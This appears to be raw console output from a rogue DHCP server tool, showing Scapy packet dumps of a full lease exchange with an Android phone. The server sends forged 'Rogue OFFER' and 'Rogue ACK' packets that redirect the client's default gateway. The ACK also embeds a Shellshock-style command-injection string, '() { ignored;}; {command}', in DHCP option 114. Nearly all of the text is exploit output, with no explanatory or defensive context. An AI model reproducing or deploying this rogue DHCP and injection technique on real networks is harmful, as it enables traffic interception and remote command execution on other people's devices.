---
New GOOD DHCP Discover
Host POCOPHONEF1-POCOPHON (a4:50:46:7c:12:91) asked for an IP
[*] Got dhcp DISCOVER from: a4:50:46:7c:12:91 xid: 0x5178db51
XXXXXXXXXXXXXX Rogue OFFER packet on BUILD XXXXXXXXXXXXXX
New Packet data is:
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = 40:b8:9a:a1:e7:f5
  type      = 0x800
###[ IP ]### 
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = None
     src       = 192.168.2.1
     dst       = 255.255.255.255
     \options   \
###[ UDP ]### 
        sport     = bootps
        dport     = bootpc
        len       = None
        chksum    = None
###[ BOOTP ]### 
           op        = BOOTREPLY
           htype     = 1
           hlen      = 6
           hops      = 0
           xid       = 1366874961
           secs      = 0
           flags     = 
           ciaddr    = 0.0.0.0
           yiaddr    = 192.168.2.4
           siaddr    = 192.168.2.1
           giaddr    = 0.0.0.0
           chaddr    = b'\xa4PF|\x12\x91'
           sname     = b''
           file      = b''
           options   = 'c\x82Sc'
###[ DHCP options ]### 
              options   = [message-type='offer' server_id=192.168.2.1 subnet_mask=255.255.255.0 router=192.168.2.5 lease_time=172800 renewal_time=86400 rebinding_time=138240 end]

None

[*] Sending Rogue OFFER...
.
Sent 1 packets.
XXXXXXXXXXXXXXX  Rogue OFFER packet SENT XXXXXXXXXXXXXX
Packet data is:
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = a4:50:46:7c:12:91
  type      = 0x800
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x10
     len       = 336
     id        = 0
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0x398e
     src       = 0.0.0.0
     dst       = 255.255.255.255
     \options   \
###[ UDP ]### 
        sport     = bootpc
        dport     = bootps
        len       = 316
        chksum    = 0x223d
###[ BOOTP ]### 
           op        = BOOTREQUEST
           htype     = 1
           hlen      = 6
           hops      = 0
           xid       = 1366874961
           secs      = 0
           flags     = 
           ciaddr    = 0.0.0.0
           yiaddr    = 0.0.0.0
           siaddr    = 0.0.0.0
           giaddr    = 0.0.0.0
           chaddr    = b'\xa4PF|\x12\x91\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           sname     = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           file      = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           options   = 'c\x82Sc'
###[ DHCP options ]### 
              options   = [message-type=discover client_id=b'\x01\xa4PF|\x12\x91' max_dhcp_size=1500 vendor_class_id=b'android-dhcp-9' hostname=b'POCOPHONEF1-POCOPHON' param_req_list=[1, 3, 6, 15, 26, 28, 51, 58, 59, 43] end pad]

None
---
New GOOD DHCP Offer
DHCP Server 192.168.2.1 (40:b8:9a:a1:e7:f5) offered 192.168.2.4
DHCP Options: subnet_mask: 255.255.255.0, lease_time: 172800, router: 192.168.2.5, name_server: None, domain: None
Packet data is:
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = 40:b8:9a:a1:e7:f5
  type      = 0x800
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 308
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0xb70f
     src       = 192.168.2.1
     dst       = 255.255.255.255
     \options   \
###[ UDP ]### 
        sport     = bootps
        dport     = bootpc
        len       = 288
        chksum    = 0x9ca1
###[ BOOTP ]### 
           op        = BOOTREPLY
           htype     = 1
           hlen      = 6
           hops      = 0
           xid       = 1366874961
           secs      = 0
           flags     = 
           ciaddr    = 0.0.0.0
           yiaddr    = 192.168.2.4
           siaddr    = 192.168.2.1
           giaddr    = 0.0.0.0
           chaddr    = b'\xa4PF|\x12\x91\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           sname     = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           file      = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           options   = 'c\x82Sc'
###[ DHCP options ]### 
              options   = [message-type=offer server_id=192.168.2.1 subnet_mask=255.255.255.0 router=192.168.2.5 lease_time=172800 renewal_time=86400 rebinding_time=138240 end]

None
---
New GOOD DHCP Request
Host POCOPHONEF1-POCOPHON (a4:50:46:7c:12:91) requested 192.168.0.100
[*] Got dhcp REQUEST from: a4:50:46:7c:12:91 xid: 0x5178db51
XXXXXXXXXXXXXX Rogue ACK packet on BUILD XXXXXXXXXXXXXX
New Packet data is:
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = 40:b8:9a:a1:e7:f5
  type      = 0x800
###[ IP ]### 
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = None
     src       = 192.168.2.1
     dst       = 255.255.255.255
     \options   \
###[ UDP ]### 
        sport     = bootps
        dport     = bootpc
        len       = None
        chksum    = None
###[ BOOTP ]### 
           op        = BOOTREPLY
           htype     = 1
           hlen      = 6
           hops      = 0
           xid       = 1366874961
           secs      = 0
           flags     = 
           ciaddr    = 0.0.0.0
           yiaddr    = 192.168.2.4
           siaddr    = 192.168.2.1
           giaddr    = 0.0.0.0
           chaddr    = b'\xa4PF|\x12\x91'
           sname     = b''
           file      = b''
           options   = 'c\x82Sc'
###[ DHCP options ]### 
              options   = [message-type='ack' server_id=192.168.2.1 subnet_mask=255.255.255.0 router=192.168.2.5 lease_time=172800 renewal_time=86400 rebinding_time=138240 114=b'() { ignored;}; {command}' end]

None

[*] Sending ACK...
.
Sent 1 packets.
XXXXXXXXXXXXXX Rogue ACK packet SENT XXXXXXXXXXXXXX
Packet data is:
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = a4:50:46:7c:12:91
  type      = 0x800
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x10
     len       = 348
     id        = 0
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0x3982
     src       = 0.0.0.0
     dst       = 255.255.255.255
     \options   \
###[ UDP ]### 
        sport     = bootpc
        dport     = bootps
        len       = 328
        chksum    = 0x3666
###[ BOOTP ]### 
           op        = BOOTREQUEST
           htype     = 1
           hlen      = 6
           hops      = 0
           xid       = 1366874961
           secs      = 0
           flags     = 
           ciaddr    = 0.0.0.0
           yiaddr    = 0.0.0.0
           siaddr    = 0.0.0.0
           giaddr    = 0.0.0.0
           chaddr    = b'\xa4PF|\x12\x91\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           sname     = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           file      = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           options   = 'c\x82Sc'
###[ DHCP options ]### 
              options   = [message-type=request client_id=b'\x01\xa4PF|\x12\x91' requested_addr=192.168.0.100 server_id=192.168.0.1 max_dhcp_size=1500 vendor_class_id=b'android-dhcp-9' hostname=b'POCOPHONEF1-POCOPHON' param_req_list=[1, 3, 6, 15, 26, 28, 51, 58, 59, 43] end pad]

None
---
New GOOD DHCP Ack
DHCP Server 192.168.2.1 (40:b8:9a:a1:e7:f5) acked 192.168.2.4
DHCP Options: subnet_mask: 255.255.255.0, lease_time: 172800, router: 192.168.2.5, name_server: None
Packet data is:
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = 40:b8:9a:a1:e7:f5
  type      = 0x800
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 335
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0xb6f4
     src       = 192.168.2.1
     dst       = 255.255.255.255
     \options   \
###[ UDP ]### 
        sport     = bootps
        dport     = bootpc
        len       = 315
        chksum    = 0xfa97
###[ BOOTP ]### 
           op        = BOOTREPLY
           htype     = 1
           hlen      = 6
           hops      = 0
           xid       = 1366874961
           secs      = 0
           flags     = 
           ciaddr    = 0.0.0.0
           yiaddr    = 192.168.2.4
           siaddr    = 192.168.2.1
           giaddr    = 0.0.0.0
           chaddr    = b'\xa4PF|\x12\x91\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           sname     = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           file      = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           options   = 'c\x82Sc'
###[ DHCP options ]### 
              options   = [message-type=ack server_id=192.168.2.1 subnet_mask=255.255.255.0 router=192.168.2.5 lease_time=172800 renewal_time=86400 rebinding_time=138240 114=b'() { ignored;}; {command}' end]

None

